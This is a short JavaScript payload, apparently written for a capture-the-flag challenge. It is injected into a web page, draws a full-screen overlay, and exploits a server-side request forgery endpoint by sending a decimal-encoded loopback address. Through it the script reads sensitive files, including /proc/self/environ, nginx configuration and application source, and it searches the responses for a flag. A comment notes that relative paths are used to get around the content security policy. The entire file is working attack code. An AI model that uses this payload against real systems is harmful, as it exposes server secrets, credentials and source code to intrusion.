var results = document.createElement('div');
results.style = 'position:fixed;top:0;left:0;width:100%;height:100%;overflow:auto;background:black;color:lime;font-family:monospace;font-size:13px;padding:20px;z-index:9999';
document.body.appendChild(results);

function log(msg) { results.innerHTML += msg + '<br>'; }

log('=== Enumerando via SSRF ===<br>');

var systemFiles = [
  '/proc/self/cmdline',
  '/proc/self/environ',
  '/proc/self/cwd',
  '/proc/self/exe',
  '/etc/nginx/nginx.conf',
  '/etc/nginx/sites-enabled/default',
  '/etc/nginx/conf.d/default.conf',
  '/app.py',
  '/main.py',
  '/server.py',
  '/flag.txt',
];

// Usar rutas RELATIVAS para evitar CSP
async function scan() {
  for (const path of systemFiles) {
    const url = '/check?url=' + encodeURIComponent('http://2130706433' + path);
    try {
      const r = await fetch(url);
      const d = await r.text();

      if(d.includes('HCRD')) {
        log('<span style="color:yellow;font-size:24px">🚩 FLAG EN ' + path + ': ' + d + '</span>');
        alert('FLAG: ' + d);
      } else if(!d.includes('404') && !d.includes('not allowed') && !d.includes('Connection refused') && !d.includes('403')) {
        log('<span style="color:lime">✅ ' + path + ':</span>');
        log('<span style="color:white;word-break:break-all">' + d.substring(0, 800) + '</span><br>');
      } else {
        log('<span style="color:gray">❌ ' + path + ' → ' + d.substring(0,100) + '</span>');
      }
    } catch(e) {
      log('<span style="color:red">ERROR ' + path + ': ' + e + '</span>');
    }
    await new Promise(r => setTimeout(r, 300));
  }
  log('<br>=== Scan completo ===');
}

scan();